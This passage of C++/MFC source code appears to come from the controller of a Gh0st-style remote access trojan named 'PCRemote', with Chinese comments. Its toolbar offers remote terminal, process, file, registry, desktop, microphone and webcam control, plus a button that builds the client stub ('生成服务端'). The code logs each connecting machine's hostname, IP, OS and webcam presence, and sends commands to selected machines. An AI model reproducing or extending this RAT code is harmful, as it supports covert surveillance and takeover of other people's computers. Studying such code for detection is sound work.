		IDB_BITMAP_MAIN
		);
	RECT rt,rtMain;
	GetWindowRect(&rtMain);
	rt.left=0;
	rt.top=0;
	rt.bottom=80;
	rt.right=rtMain.right-rtMain.left+10;
	m_ToolBar.MoveWindow(&rt,TRUE);

	m_ToolBar.SetButtonText(0,"终端管理");  
	m_ToolBar.SetButtonText(1,"进程管理"); 
	m_ToolBar.SetButtonText(2,"窗口管理"); 
	m_ToolBar.SetButtonText(3,"桌面管理"); 
	m_ToolBar.SetButtonText(4,"文件管理"); 
	m_ToolBar.SetButtonText(5,"语音管理"); 
	m_ToolBar.SetButtonText(6,"视频管理"); 
	m_ToolBar.SetButtonText(7,"服务管理"); 
	m_ToolBar.SetButtonText(8,"注册表管理"); 
	m_ToolBar.SetButtonText(10,"参数设置"); 
	m_ToolBar.SetButtonText(11,"生成服务端"); 
	m_ToolBar.SetButtonText(12,"帮助"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
}


void CPCRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: // click or dbclick left button on icon
	case WM_LBUTTONDBLCLK: // should show desktop
		if (!IsWindowVisible()) 
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);
		break;
	case WM_RBUTTONDOWN: // click right button, show menu
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
			point.x, point.y, this, NULL); 
		PostMessage(WM_USER, 0, 0);
		break;
	}
}

void CPCRemoteDlg::OnNotifyClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE);
}


void CPCRemoteDlg::OnNotifyShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOW);
}


void CPCRemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	Shell_NotifyIcon(NIM_DELETE, &nid);
	CDialogEx::OnClose();
}


LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext	*pContext = (ClientContext *)lParam;    //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
		//int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		//CString	str;
		//str.Format("%d", m_nCount++);	

		// IP地址
		//int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		//m_pListCtrl->SetItemText(i, 1, IPAddress);
		strIP=IPAddress;

		// 内网IP
		//m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		//strAddr=inet_ntoa(LoginInfo->IPAddress);
		// 主机名
		//m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
		strPCName=LoginInfo->HostName;
		// 系统

		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
				pszOS = "2003";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "Vista";  // Just Joking
		}
		strOS.Format
			(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		//m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		//m_pListCtrl->SetItemText(i, 5, str);

		// Speed
		strPing.Format("%d", LoginInfo->dwSpeed);
		//m_pListCtrl->SetItemText(i, 6, str);


		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
		//m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
		{

			strAddr = m_QQwry->IPtoAdd(IPAddress);

			//strToolTipsText += "\nArea: ";
			//strToolTipsText += str;
		}
		// 指定唯一标识
		//m_pListCtrl->SetItemData(i, (DWORD) pContext);    //这里将服务端的套接字等信息加入列表中保存
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,pContext);
	}catch(...){}

	return 0;
}

void CPCRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{

	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_CList_Online.GetNextSelectedItem(pos);                          //lang2.1_2
		ClientContext* pContext = (ClientContext*)m_CList_Online.GetItemData(nItem); //从列表条目中取出ClientContext结构体
		// 发送获得驱动器列表数据包                                                 //查看  ClientContext结构体
		m_iocpServer->Send(pContext, pData, nSize);      //调用  m_iocpServer  的Send 函数发送数据  查看m_iocpServer 定义

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}


void CPCRemoteDlg::OnOnlineRegedit()
{
	// TODO: 在此添加命令处理程序代码
	BYTE	bToken = COMMAND_REGEDIT;         
	SendSelectCommand(&bToken, sizeof(BYTE));
}

LRESULT CPCRemoteDlg::OnOpenRegEditDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);  //动态创建CSystemDlg

	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());      //创建对话框
	dlg->ShowWindow(SW_SHOW);                      //显示对话框

	pContext->m_Dialog[0] = REGEDIT_DLG;              //这个值用做服务端再次发送数据时的标识
	pContext->m_Dialog[1] = (int)dlg;
	//先看一下这个对话框的界面再看这个对话框类的构造函数
	return 0;
}